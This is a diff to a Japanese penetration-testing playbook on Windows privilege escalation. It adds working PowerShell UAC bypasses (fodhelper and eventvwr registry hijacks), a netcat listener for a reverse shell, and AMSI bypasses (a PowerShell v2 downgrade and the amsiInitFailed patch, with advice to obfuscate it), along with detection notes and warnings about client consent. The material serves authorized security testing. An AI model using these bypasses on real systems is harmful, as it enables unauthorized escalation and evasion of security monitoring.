@@ -96,6 +96,108 @@ net user [USERNAME] /domain   # ドメイン上のユーザー情報・最終ロ
 | `SeEnableDelegationPrivilege` | Unconstrained Delegation を設定可能 |
 | `SeDebugPrivilege` | プロセスメモリへのアクセス → LSASS ダンプ |
 
+→ 各特権の具体的な悪用手順（Potato系・SAMダンプ・LSASSダンプ）: `Privilege_Tokens.md`
+
+---
+
+## Step 1.3: UAC 状態確認と回避分岐
+
+**攻撃者の思考トレース：** 中権限シェル（例：IIS アプリプール / 一般ユーザー）から SYSTEM に昇格する際、UAC（ユーザーアカウント制御）が壁になる。UAC レベルと自動昇格バイナリの有無を確認し、突破方法を選定する。UAC が無効または最低レベルの場合は UAC 回避ステップをスキップして直接昇格できる。
+
+### UAC レベルの確認
+
+```powershell
+# [Target] ConsentPromptBehaviorAdmin 値で UAC レベルを判定
+$uac = Get-ItemProperty `
+  -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
+  -Name "ConsentPromptBehaviorAdmin" -ErrorAction SilentlyContinue
+$uac.ConsentPromptBehaviorAdmin
+# 0 → UAC 無効（昇格なしで管理操作可能。UAC 回避ステップ不要）
+# 1 → 安全なデスクトップ上で資格情報を要求（最も厳格）
+# 2 → 安全なデスクトップ上で同意を要求（PromptForConsent）
+# 5 → 通常の同意ダイアログ（デフォルト）
+# その他 → ヘルプ参照（EnableLUA = 0 との組み合わせも確認）
+```
+
+```powershell
+# [Target] EnableLUA も確認（0 の場合は UAC 自体が無効）
+(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA
+# 0 → UAC 無効。管理者グループに入っていれば昇格操作は自由
+# 1 → UAC 有効（ConsentPromptBehaviorAdmin の値を確認）
+```
+
+**何が出たら次に何をするか（UAC 確認）：**
+
+| ConsentPromptBehaviorAdmin / EnableLUA | 判断・次のアクション |
+|--------------------------------------|------------------|
+| `EnableLUA = 0` / UAC 無効 | UAC 回避不要。管理者グループメンバーなら直接管理操作可能 |
+| `ConsentPromptBehaviorAdmin = 0` | UAC ダイアログなし昇格。回避ステップをスキップできる |
+| `ConsentPromptBehaviorAdmin = 5`（デフォルト） | 自動昇格バイナリを利用した UAC バイパスを試みる（下記参照） |
+| `ConsentPromptBehaviorAdmin = 1 or 2` | 安全なデスクトップ。自動昇格バイナリも資格情報を要求されるため厳しい |
+
+### UAC バイパス（自動昇格バイナリ悪用）
+
+**着火条件：** `ConsentPromptBehaviorAdmin = 5`（デフォルト UAC）かつ、現在のユーザーが Administrators グループに入っている場合。
+
+> **自動昇格バイナリとは：** Windows が「この EXE は信頼できる」として UAC ダイアログを出さずに高権限で動かすと判定するバイナリ（`aiostackinstaller.exe`、`fodhelper.exe`、`eventvwr.exe`、`sdclt.exe`、`cmstp.exe` 等）。これらはレジストリの特定キーを読み込む設計になっており、そのキーを書き換えることで任意コマンドを高権限で実行させる。
+
+```powershell
+# [Target] 方法 1 — fodhelper.exe を悪用（Windows 10 / Server 2016 以降で定番）
+# HKCU 下のレジストリキーを作成・設定（標準ユーザー権限で書けるキー）
+New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+Set-ItemProperty `
+  -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
+  -Name "(Default)" `
+  -Value "cmd /c [COMMAND]"   # [COMMAND]: 実行したいコマンド（例: whoami > C:\Windows\Temp\out.txt）
+Set-ItemProperty `
+  -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
+  -Name "DelegateExecute" -Value ""
+Start-Process "C:\Windows\System32\fodhelper.exe"
+# 実行後、レジストリキーを削除する（原状回復）
+Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
+```
+
+```powershell
+# [Target] 方法 2 — eventvwr.exe を悪用（Windows 10 初期から有効。古めの環境向け）
+New-Item -Path "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
+Set-ItemProperty `
+  -Path "HKCU:\Software\Classes\mscfile\Shell\Open\command" `
+  -Name "(Default)" `
+  -Value "cmd /c [COMMAND]"
+Start-Process "C:\Windows\System32\eventvwr.exe"
+Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force
+```
+
+**事前準備（必須）：** 上記コマンドはターゲット上で実行する。リバースシェルが必要な場合は、実行前にテスター端末でリスナーを起動しておく（`nc -lvnp [PORT]`）。
+
+**UACME / Metasploit モジュールの使い分け：**
+
+| ツール | 用途・特徴 | 検知性 |
+|--------|-----------|------|
+| **UACME**（GitHub: hfiref0x/UACME） | 多数の UAC バイパス技法を番号で選択可能。C2 なしで単体動作 | EXE 自体が AV シグネチャ対象。転送後にブロックされる可能性あり |
+| **Metasploit `exploit/windows/local/bypassuac_fodhelper`** | Metasploit セッション内で直接実行可能 | プロセスツリー・ペイロードが EDR 検知対象 |
+| **手動レジストリ操作**（上記） | ツール不要。PowerShell のみで完結 | 検知性は中程度。AMSI バイパスと組み合わせて使うことが多い |
+
+**原状回復（必須）：**
+
+```powershell
+# [Target] 使用したレジストリキーを削除（fodhelper バイパス後）
+Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
+# eventvwr バイパス後
+Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force
+```
+
+### 刺さらなかったとき（UAC バイパス）
+
+| 現象 | 原因 | 代替 |
+|------|------|------|
+| `fodhelper` 実行してもコマンドが動かない | Windows 11 / 最新パッチで修正済み | `sdclt.exe` バイパス（UACME #61 等）を試す |
+| レジストリキーへの書き込みが拒否される | AppLocker / WDAC が HKCU 書き込みを制限している | UACME の別技法 / Metasploit モジュールを試す |
+| `ConsentPromptBehaviorAdmin = 1` または `2` | 安全なデスクトップ上でのプロンプト。バイパス困難 | 資格情報スプレー・SeImpersonate 等の別経路へ切り替える |
+| Administrators グループに入っていない | 前提条件不成立 | SeImpersonate 等の低権限からの昇格手法を先に試す |
+
+> **商用案件の注意点：** UAC バイパス自体は Sysmon Event ID 13（RegistryEvent: HKCU\Software\Classes 下の書き込み）で検知される。Defender for Endpoint は `bypassuac_` 系の挙動パターンを「UAC modification」として検知する。合意範囲内であることを確認してから実施する。
+
 ---
 
 ## Step 1.5: ローカルにしか公開されていないサービスの発見
@@ -402,7 +504,87 @@ searchsploit [技術名] [バージョン]
 - 実行前に `C:\Windows\Temp` への書き込み権限があるか確認する（`echo test > C:\Windows\Temp\test.txt`）
 - PowerShell の実行ポリシーが `Restricted` の場合は `.ps1` を直接実行できない。`IEX` 経由か `powershell -ExecutionPolicy Bypass -File exploit.ps1` で回避
 - GitHub から落とした PoC は README で**前提条件**（OS バージョン・権限・必要なグループ）を必ず確認してから実行する
-- 新しいバージョンの Windows Server / Windows クライアントには新しいセキュリティ機構（Windows Defender・AMSI 等）が有効なことが多い。エラーが出た場合はアンチウイルス回避を検討する
+- 新しいバージョンの Windows Server / Windows クライアントには新しいセキュリティ機構（Windows Defender・AMSI 等）が有効なことが多い。エラーが出た場合は下記 AMSI バイパスを検討する
+
+---
+
+### AMSI バイパス（PowerShell スクリプトがブロックされる場合）
+
+**着火条件：** PowerShell スクリプト（`.ps1`）や `IEX` 経由のコードが AMSI によってブロックされる場合。Windows Defender 等が「Invoke-Expression がマルウェアを含んでいる可能性がある」として停止させる。
+
+> **AMSI（Antimalware Scan Interface）とは：** Windows 10 以降に搭載された API。PowerShell / VBScript / WScript 等がスクリプトを実行する直前に AV エンジンに内容を渡してスキャンさせる仕組み。ファイル書き込みなしでもメモリ上のスクリプト内容を検査できる。
+
+**攻撃者の思考トレース：** AMSI が有効な環境で `.ps1` を直接実行するとブロックされる。AMSI は `amsi.dll` として PowerShell プロセスにロードされているため、そのメモリ上の `AmsiScanBuffer` 関数をパッチして無効化する手法が広く使われる。ただし商用案件ではパッチ方式は EDR がトリップレットするため、Downgrade Attack（PowerShell v2）が相対的に低リスクな場合がある。
+
+#### AMSI の有効状態確認
+
+```powershell
+# [Target] AMSI ユーティリティクラスがロードされているか確認（PS v5.1 環境向け）
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+# クラスが返ってくる → AMSI が有効な PowerShell 5.x 環境
+# 例外が出る → PowerShell v2（AMSI 非搭載）または既にバイパス済み
+```
+
+#### 方法 1 — PowerShell Downgrade Attack（PS v2 へのダウングレード）
+
+**検知性：低〜中。EDR では「PowerShell v2 の起動」が怪しいシグナルとして記録されることがある。**
+商用案件では `amsi.dll` メモリパッチより相対的にリスクが低い。
+
+```powershell
+# [Target] PowerShell v2 で起動（AMSI は v3 以降に搭載されたため v2 には存在しない）
+powershell -Version 2 -Command { [YOUR_COMMAND_HERE] }
+# または対話シェル起動
+powershell -Version 2
+```
+
+**事前確認（必須）：** v2 が使えるかどうかを確認する。
+
+```powershell
+# [Target] .NET Framework 2.0 のインストール確認（PS v2 の依存）
+Get-WindowsFeature -Name PowerShell-V2 2>$null
+# または
+(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine").PowerShellVersion
+# 2.0 が返ってくれば v2 が利用可能
+```
+
+**刺さらなかったとき：** Windows Server 2019 / Windows 11 以降では PS v2 が削除されていることが多い。その場合は方法 2 または 3 を検討する。
+
+#### 方法 2 — AmsiScanBuffer メモリパッチ
+
+> **[HIGH IMPACT]** ETW パッチ・AMSI メモリパッチはカーネルレベルの EDR（CrowdStrike / SentinelOne 等）で「Suspicious AMSI patch」として確実に検知される。商用案件では事前合意が必要。**EDR が有効な環境での実施は最高リスク扱い**。
+
+```powershell
+# [Target] AmsiScanBuffer を常に「スキャン結果 = 0（クリーン）」に書き換えるパッチ
+# ※ このコード自体が AMSI にブロックされるため、文字列を分割・エンコードして渡す必要がある
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b = $a.GetField('amsiInitFailed','NonPublic,Static')
+$b.SetValue($null,$true)
+# amsiInitFailed を true にして AMSI 初期化失敗を模倣する（軽量な回避方法）
+```
+
+**実際の商用案件での注意：** 上記コードそのまま貼り付けてもAMSI自身に検知されてブロックされる。文字列を ROT13・base64・変数分割などで難読化してからペーストする必要がある。難読化コードの生成方法は都度変わるため、ツール（Invoke-Obfuscation 等）または手動分割を使う。
+
+#### 方法 3 — ETW 無効化との組み合わせ
+
+> **ETW（Event Tracing for Windows）** はEDR がリアルタイムで PowerShell の動作ログを取得するチャネル。ETW 無効化は AMSI バイパスより検知リスクが高く、**商用案件では原則としてETW パッチは禁止操作として扱うこと。**
+
+```powershell
+# [Target] ETW の PowerShell プロバイダを無効化（NtTraceEvent をパッチ）
+# ※ 高リスク操作。EDR が必ず検知する。商用案件では事前書面合意がない限り実施しない
+[Reflection.Assembly]::LoadWithPartialName('System.Core') | Out-Null
+$etwpatch = [System.Runtime.InteropServices.Marshal]
+# ... (実装は省略。商用案件ではこの手法は事前合意なしに使用しない)
+```
+
+#### AMSI バイパスの検知観点と商用案件での扱い
+
+| 方法 | Sysmon / EDR 検知 | 商用案件リスク |
+|------|-----------------|-------------|
+| PowerShell v2 Downgrade | Sysmon Event ID 1（PS v2 起動）/ Defender「PowerShell downgrade attack」 | 中（使用前に合意推奨） |
+| `amsiInitFailed` パッチ | EDR「AMSI bypass attempt」/ Sysmon Event ID 10（PS への自己プロセスアクセス） | 高（書面合意必須） |
+| ETW パッチ | EDR「ETW tampering」/ Sysmon Event ID 8（CreateRemoteThread to ntdll.dll） | 最高（商用案件では原則禁止） |
+
+**商用案件での結論：** AMSI が壁になる場合は、まず **PowerShell v2 Downgrade** を試みる。それも使えない環境（PS v2 削除済み・Defender が v2 も監視）では、**ツール選択を変える**（PoC を C# バイナリにコンパイルして直接 EXE 実行 → AMSI は PS スクリプトを対象とするため）か、**実施範囲をクライアントに再確認**する。
 
 ---
 
@@ -414,3 +596,5 @@ searchsploit [技術名] [バージョン]
 - 後：SeEnableDelegationPrivilege がある → `Delegation_Attacks/Unconstrained.md`
 - 後：Kerberoastable アカウントがある → `Kerberos_Attacks/Kerberoasting.md`
 - 後：CVE の絞り込み・PoC の探し方 → `../../05_Tools_Reference/Searchsploit.md`
+- 後：UAC バイパスで SYSTEM に昇格後 → `Privilege_Tokens.md`（SeImpersonate / Potato系）
+- 後：EDR がカーネルレベルで動作しており PS / EXE をすべてブロックする → `BYOVD.md`
